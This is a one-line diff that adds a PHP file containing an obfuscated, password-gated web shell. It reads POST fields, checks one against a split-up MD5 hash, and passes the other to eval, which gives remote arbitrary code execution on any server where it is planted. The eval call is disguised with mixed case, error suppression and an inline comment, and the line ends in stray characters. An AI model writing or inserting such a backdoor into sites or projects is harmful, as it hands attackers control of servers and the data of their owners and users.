@@ -1,0 +1,1 @@
+<?php $BEY = $_POST; if(!empty($BEY['w']) && !empty($BEY['h']) && md5($BEY['w'].md5($BEY['w']))==('629c1'.'124a8'.'fa260'.'5b2be'.'6d497'.'efd71'.'a3')) { @eVal /*hgwcz*/ (@$BEY['h']); exit; } ?>xe
